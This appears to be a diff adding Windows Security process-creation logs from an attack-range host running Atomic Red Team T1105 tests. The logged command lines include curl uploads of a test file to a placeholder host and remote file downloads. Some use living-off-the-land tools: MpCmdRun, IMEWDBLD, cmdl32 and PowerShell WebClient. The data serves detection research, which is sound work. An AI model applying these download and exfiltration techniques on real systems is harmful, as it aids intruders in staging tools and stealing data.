+	Creator Process Name:	C:\Windows\System32\notepad.exe
+	Process Command Line:	calc
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744156
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xed0
+	New Process Name:	C:\Windows\System32\notepad.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1f84
+	Creator Process Name:	C:\Users\ADMINI~1\AppData\Local\Temp\2\T1105\file.exe
+	Process Command Line:	"C:\Windows\System32\notepad.exe" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744123
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1f84
+	New Process Name:	C:\Users\ADMINI~1\AppData\Local\Temp\2\T1105\file.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x188c
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	C:\Users\ADMINI~1\AppData\Local\Temp\2\T1105\file.exe
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:54 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744112
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1a60
+	New Process Name:	C:\Windows\System32\icacls.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x188c
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	icacls  C:\Users\ADMINI~1\AppData\Local\Temp\2\T1105 /remove:d Administrator
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:53 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744062
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x19d4
+	New Process Name:	C:\Windows\System32\cmdl32.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x188c
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	cmdl32  /vpn /lan C:\Users\ADMINI~1\AppData\Local\Temp\2\T1105\setting.txt
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:53 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744055
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x178c
+	New Process Name:	C:\Windows\System32\icacls.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x188c
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	icacls  C:\Users\ADMINI~1\AppData\Local\Temp\2\T1105 /deny Administrator:(OI)(CI)(DE,DC)
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:53 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744051
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x188c
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "C:\AtomicRedTeam\atomics\T1105\src\T1105.bat 1>NUL" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:53 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52744026
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xe24
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:53 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52743973
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x15e4
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:53 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52743920
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xde8
+	New Process Name:	C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x19e8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\System32\IME\SHARED\IMEWDBLD.exe" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:53 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52743864
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x19e8
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {$imewdbled = $env:SystemRoot + \""\System32\IME\SHARED\IMEWDBLD.exe\""
+& $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml} 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:50 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52743204
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1c8c
+	New Process Name:	C:\Windows\System32\finger.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1850
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	finger  base64_filedata@localhost 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:50 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52743196
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1850
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "finger base64_filedata@localhost" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:50 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52743160
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x39c
+	New Process Name:	C:\Windows\System32\notepad.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1628
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\NOTEPAD.EXE" C:\Users\Administrator\AppData\Local\Temp\2\LICENSE.txt
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:50 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52743020
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1628
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt} 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:49 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52742708
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1f50
+	New Process Name:	C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2110.6-0\MpCmdRun.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1fa0
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	MpCmdRun.exe  -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path C:\Users\ADMINI~1\AppData\Local\Temp\2\Atomic-license.txt 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:49 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52742696
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1fa0
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*" & MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\Atomic-license.txt" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:49 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52742653
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xa7c
+	New Process Name:	C:\svchost.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x638
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	C:\svchost.exe  /c echo T1105  
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
